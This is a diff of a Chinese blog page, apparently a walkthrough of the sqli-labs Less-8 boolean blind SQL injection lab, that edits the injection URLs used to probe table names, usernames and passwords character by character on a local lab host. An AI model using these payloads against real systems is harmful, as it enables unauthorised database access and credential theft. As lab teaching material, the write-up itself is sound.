@@ -682,7 +682,7 @@ SQL盲注的分类
 <ol start="4">
 <li><strong>判断表</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security'limit 0,1),1,1))=101%23</code></pre><p><img src="https://i.loli.net/2019/10/15/2PojderbXO8pgEM.png" alt="less8-14.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101%23</code></pre><p><img src="https://i.loli.net/2019/10/15/2PojderbXO8pgEM.png" alt="less8-14.png"></p>
 <ol start="5">
 <li><strong>判断字段</strong></li>
 </ol>
@@ -691,7 +691,7 @@ SQL盲注的分类
 <li><strong>判断数据</strong></li>
 </ol>
 <pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select username FROM security.users limit 0,1),1,1))=68%23</code></pre><p><img src="https://i.loli.net/2019/10/15/oga2zSMfjBPUFtL.png" alt="less8-16.png"></p>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select password FROM security.users limit 0,1),1,1))=105%23</code></pre><p><img src="https://i.loli.net/2019/10/15/aebTfXqFs8iWMZ9.png" alt="less8-17.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select password FROM security.users limit 0,1),1,1))=68%23</code></pre><p><img src="https://i.loli.net/2019/10/15/aebTfXqFs8iWMZ9.png" alt="less8-17.png"></p>
 <h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8318639.html" target="_blank" rel="noopener">【sqli-labs】 less8 GET - Blind - Boolian Based - Single Quotes (基于布尔的单引号GET盲注)</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -965,7 +965,7 @@ gitment.render('gitment-content');
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">19.7k</span>&nbsp;字
+                class="white-color">20.2k</span>&nbsp;字
                
             
 			
